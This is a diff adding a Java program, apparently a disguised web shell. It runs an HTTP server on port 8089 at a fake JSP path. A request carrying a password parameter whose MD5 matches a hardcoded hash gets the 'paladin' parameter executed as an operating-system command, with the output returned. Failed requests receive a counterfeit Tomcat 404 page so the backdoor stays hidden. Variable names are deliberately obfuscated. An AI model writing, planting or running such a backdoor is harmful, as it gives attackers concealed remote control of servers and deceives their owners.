@@ -1,0 +1,112 @@
+#!/usr/bin/java --source 11
+
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.io.OutputStream;
+import java.net.*;
+import com.sun.net.httpserver.*;
+import java.util.concurrent.*;
+import java.util.Arrays;
+import java.util.HashMap;
+import java.math.BigInteger;
+import java.security.MessageDigest;
+import java.security.NoSuchAlgorithmException;
+
+public class Sample {
+
+    public static void main(String[] args) {
+
+        ExecutorService executor = Executors.newFixedThreadPool(5);
+
+        try {
+            HttpServer server = HttpServer.create(new InetSocketAddress(8089), 0);
+            HttpContext context = server.createContext("/examples/Sampleappz.jsp");
+            context.setHandler(Sample::HandleBar);
+            server.setExecutor(null);
+            server.start();
+
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+
+    }
+
+    private static String getMd5(String input) {
+        try {
+            MessageDigest md = MessageDigest.getInstance("MD5");
+            byte[] messageDigest = md.digest(input.getBytes());
+            BigInteger no = new BigInteger(1, messageDigest);
+            String hashtext = no.toString(16);
+            while (hashtext.length() < 32) {
+                hashtext = "0" + hashtext;
+            }
+            return hashtext;
+        } catch (NoSuchAlgorithmException e) {
+            throw new RuntimeException(e);
+        }
+    }
+
+    private static void HandleBar(HttpExchange exchange) throws IOException {
+
+        String method = exchange.getRequestMethod();
+        String[] req = null;
+        if (method.toLowerCase().equals("get"))
+            req = (exchange.getRequestURI().getQuery()).split("&");
+        else if (method.toLowerCase().equals("post"))
+            req = (new String(exchange.getRequestBody().readAllBytes(), "UTF-8")).split("&");
+        else
+            System.exit(0);
+
+        StringBuilder champion = new StringBuilder();
+        int reqLen = req.length;
+        String err = "<head><title>HTTP Status 404 Not Found</title><style type=\"text/css\">h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 404  Not Found</h1><hr class=\"line\" /><p><b>Type</b> Status Report</p><p><b>Message</b> &#47;examples&#47;katshell.jsp</p><p><b>Description</b> The origin server did not find a current representation for the target resource or is not willing to disclose that one exists.</p><hr class=\"line\" /><h3>Apache Tomcat/9.0.22</h3></body></html>";
+        if (reqLen == 0) {
+            champion.append(err);
+        } else {
+            HashMap<String, String> reqMap = new HashMap<String, String>();
+            try {
+
+                for (int i = 0; i < reqLen; i++) {
+                    String[] temp = req[i].split("=");
+                    reqMap.put(temp[0], temp[1]);
+                }
+            } catch (Exception e) {
+                champion.append(err + "malformed request");
+            }
+            if (!reqMap.containsKey("huskarl")) {
+                champion.append(err);
+            } else {
+                String pwd = "9e8386c168000a973d89adaf0b3322bc";
+                String pk = getMd5(reqMap.get("huskarl"));
+                if (!pk.equals(pwd))
+                    champion.append(err);
+                else {
+                    String paladin = reqMap.get("paladin");
+                    Process p = Runtime.getRuntime().exec(paladin);
+                    BufferedReader stdIn = new BufferedReader(new InputStreamReader(p.getInputStream()));
+                    BufferedReader stdErr = new BufferedReader(new InputStreamReader(p.getErrorStream()));
+
+                    String s = "";
+                    while ((s = stdIn.readLine()) != null) {
+                        champion.append(s);
+                    }
+                    while ((s = stdErr.readLine()) != null) {
+                        champion.append(s);
+                    }
+                }
+            }
+
+        }
+        champion.append("\n");
+        String hussar = champion.toString();
+        exchange.sendResponseHeaders(200, hussar.length());
+        OutputStream out = exchange.getResponseBody();
+        out.write(hussar.getBytes());
+        out.flush();
+        out.close();
+
+    }
+
+}
